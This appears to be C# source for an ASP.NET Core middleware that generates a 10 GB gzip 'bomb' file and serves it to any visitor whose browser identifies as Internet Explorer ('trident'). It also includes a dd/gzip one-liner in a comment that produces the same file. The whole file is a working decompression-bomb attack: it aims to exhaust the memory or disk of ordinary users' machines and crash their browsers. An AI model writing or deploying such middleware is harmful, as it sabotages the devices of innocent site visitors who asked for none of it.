
namespace GzipBomb
{

    // https://blog.haschek.at/post/f2fda
    // https://dzimchuk.net/understanding-aspnet-5-middleware/
    // https://xeushack.com/zip-bomb/
    
    // dd if=/dev/zero bs = 1M count=10240 | gzip > 10G.gzip 
    public class GzipBombMiddleware
    {
        private const string fileName = "10G.gzip";
        private const int ONE_MEGABYTE = 1024 * 1024;
        private const int REPEAT_COUNT = 10240;


        public static void CreateHugeGzipFile()
        {
            if (System.IO.File.Exists(fileName))
                return;

            byte[] buffer = new byte[ONE_MEGABYTE]; // 1MB

            using (System.IO.FileStream gzipTargetAsStream = System.IO.File.OpenWrite(fileName))
            {
                using (ICSharpCode.SharpZipLib.GZip.GZipOutputStream gzipStream =
                    new ICSharpCode.SharpZipLib.GZip.GZipOutputStream(gzipTargetAsStream))
                {
                    try
                    {

                        for (int i = 0; i < REPEAT_COUNT; ++i)
                        {
                            gzipStream.Write(buffer, 0, ONE_MEGABYTE);
                        } // Next i 

                    }
                    catch (System.Exception ex)
                    {
                        System.Console.WriteLine(ex.Message);
                    }
                } // End Using gzipStream 

            } // End Using gzipTargetAsStream 

        } // End Sub CreateHugeGzipFile


        private static void CreateHugeBullshitGzipFile()
        {
            if (System.IO.File.Exists(fileName))
                return;

            byte[] buffer = new byte[ONE_MEGABYTE]; // 1MB
            
            using (System.IO.FileStream gzipTargetAsStream = System.IO.File.OpenWrite(fileName))
            {
                using (System.IO.Compression.GZipStream gzipStream =
                    new System.IO.Compression.GZipStream(gzipTargetAsStream, System.IO.Compression.CompressionLevel.Optimal))
                {
                    try
                    {

                        for (int i = 0; i < REPEAT_COUNT; ++i)
                        {
                            gzipStream.Write(buffer, 0, ONE_MEGABYTE);
                            gzipStream.Flush();
                            gzipTargetAsStream.Flush();
                        } // Next i 

                    }
                    catch (System.Exception ex)
                    {
                        System.Console.WriteLine(ex.Message);
                    }
                } // End Using GZipStream 

            } // End Using gzipTargetAsStream 

        } // End Sub CreateHugeBullshitGzipFile 




        private readonly Microsoft.AspNetCore.Http.RequestDelegate m_next;


        public GzipBombMiddleware(Microsoft.AspNetCore.Http.RequestDelegate next)
        {
            this.m_next = next;
        } // End Constructor 


        public async System.Threading.Tasks.Task Invoke(Microsoft.AspNetCore.Http.HttpContext context)
        {
            try
            {
                // do your stuff here before calling the next middleware in the pipeline
                System.IO.FileInfo fi = new System.IO.FileInfo(fileName);
                
                if (context.Request.Headers.ContainsKey("USER-AGENT"))
                {
                    string ua = context.Request.Headers["USER-AGENT"];
                    if (ua != null && ua.ToLowerInvariant().IndexOf("trident") != -1)
                    {
                        context.Response.StatusCode = 200;
                        context.Response.Headers["Content-Encoding"] = "gzip";
                        context.Response.Headers["Content-Length"] = fi.Length.ToString(System.Globalization.CultureInfo.InvariantCulture);

                        byte[] buffer = new byte[32768];

                        using (System.IO.Stream inputStream = System.IO.File.OpenRead(fileName))
                        {
                            int read;
                            while ((read = inputStream.Read(buffer, 0, buffer.Length)) > 0)
                            {
                                await context.Response.Body.WriteAsync(buffer, 0, read);
                            } // Whend 

                        } // End Using inputStream 

                    } // End if (ua != null && ua.ToLowerInvariant().IndexOf("trident") != -1) 

                } // End if (context.Request.Headers.ContainsKey("USER-AGENT")) 

                await m_next(context);
                // do some more stuff here as the call is unwinding
            }
            catch (System.Exception ex)
            {
                context.Response.StatusCode = 500;
                // context.Response.Headers["WWW-Authenticate"] = "Basic";
            }

        } // End Task Invoke 


    } // End Class GzipBombMiddleware 


} // End Namespace GzipBomb 
